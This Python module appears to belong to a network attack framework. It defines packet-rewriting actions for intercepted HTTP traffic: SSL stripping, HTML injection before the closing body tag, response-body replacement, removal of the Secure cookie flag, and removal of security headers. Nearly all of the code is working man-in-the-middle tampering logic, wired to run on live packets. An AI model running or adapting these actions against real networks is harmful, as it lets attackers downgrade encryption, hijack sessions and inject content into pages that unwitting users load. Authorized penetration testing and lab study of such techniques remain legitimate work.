"""HTTP-toolkit rule actions — apply the http transforms to matched packets.

Each action parses the packet's TCP payload as an HTTP message, applies a
transform, and (if it changed) writes the rebuilt message back. Non-HTTP packets
are left untouched. Wire into the engine via rules/spec.py.
"""

from __future__ import annotations

from dataclasses import dataclass

from reforge.attacks import http
from reforge.rules.base import Action, Verdict


def _to_bytes(v) -> bytes:
    return v if isinstance(v, bytes) else str(v).encode("latin-1", "replace")


def _transform(pkt, verdict: Verdict, fn, note: str) -> None:
    from scapy.packet import Raw

    p = pkt.scapy()
    if not p.haslayer(Raw):
        return
    msg = http.parse_http(bytes(p[Raw].load))
    if msg is None:
        return
    if fn(msg):
        p[Raw].load = http.build_http(msg)
        pkt.modified = True
        verdict.notes.append(note)


@dataclass
class SslStrip(Action):
    def apply(self, pkt, verdict: Verdict) -> None:
        _transform(pkt, verdict, http.sslstrip, "http:sslstrip")


@dataclass
class StripAcceptEncoding(Action):
    def apply(self, pkt, verdict: Verdict) -> None:
        _transform(pkt, verdict, http.strip_accept_encoding, "http:strip-accept-encoding")


@dataclass
class InjectHtml(Action):
    snippet: object
    marker: str = "</body>"

    def apply(self, pkt, verdict: Verdict) -> None:
        snip = _to_bytes(self.snippet)
        marker = _to_bytes(self.marker)
        _transform(pkt, verdict, lambda m: http.inject_html(m, snip, marker), "http:inject")


@dataclass
class ReplaceBody(Action):
    body: object
    content_type: str | None = None

    def apply(self, pkt, verdict: Verdict) -> None:
        new = _to_bytes(self.body)
        _transform(pkt, verdict,
                   lambda m: http.replace_body(m, new, self.content_type), "http:replace-body")


@dataclass
class StripSecureCookie(Action):
    def apply(self, pkt, verdict: Verdict) -> None:
        _transform(pkt, verdict, http.strip_secure_cookie, "http:strip-secure-cookie")


@dataclass
class RemoveSecurityHeaders(Action):
    def apply(self, pkt, verdict: Verdict) -> None:
        _transform(pkt, verdict, http.remove_security_headers, "http:remove-sec-headers")
